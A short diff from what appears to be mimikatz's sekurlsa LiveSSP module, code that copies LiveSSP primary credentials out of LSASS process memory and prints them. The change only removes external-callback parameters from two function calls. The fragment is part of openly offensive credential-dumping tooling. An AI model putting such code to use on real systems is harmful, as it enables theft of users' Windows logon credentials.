@@ -23,10 +23,10 @@ const PKUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_livessp_single_package[] = {&kuhl
 
 NTSTATUS kuhl_m_sekurlsa_livessp(int argc, wchar_t * argv[])
 {
-	return kuhl_m_sekurlsa_getLogonData(kuhl_m_sekurlsa_livessp_single_package, 1, NULL, NULL);
+	return kuhl_m_sekurlsa_getLogonData(kuhl_m_sekurlsa_livessp_single_package, 1);
 }
 
-void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_livessp(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL PKUHL_M_SEKURLSA_EXTERNAL externalCallback, IN OPTIONAL LPVOID externalCallbackData)
+void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_livessp(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
 {
 	KIWI_LIVESSP_LIST_ENTRY credentials;
 	KIWI_LIVESSP_PRIMARY_CREDENTIAL primaryCredential;
@@ -44,7 +44,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_livessp(IN PKIWI_BASIC_SECURIT
 				{
 					aLocalMemory.address = &primaryCredential;
 					if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_LIVESSP_PRIMARY_CREDENTIAL)))
-						kuhl_m_sekurlsa_genericCredsOutput(&primaryCredential.credentials, pData->LogonId, (pData->cLsass->osContext.BuildNumber != 9431) ? 0 : KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT, externalCallback, externalCallbackData);
+						kuhl_m_sekurlsa_genericCredsOutput(&primaryCredential.credentials, pData->LogonId, (pData->cLsass->osContext.BuildNumber != 9431) ? 0 : KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT);
 				}
 			}
 		}
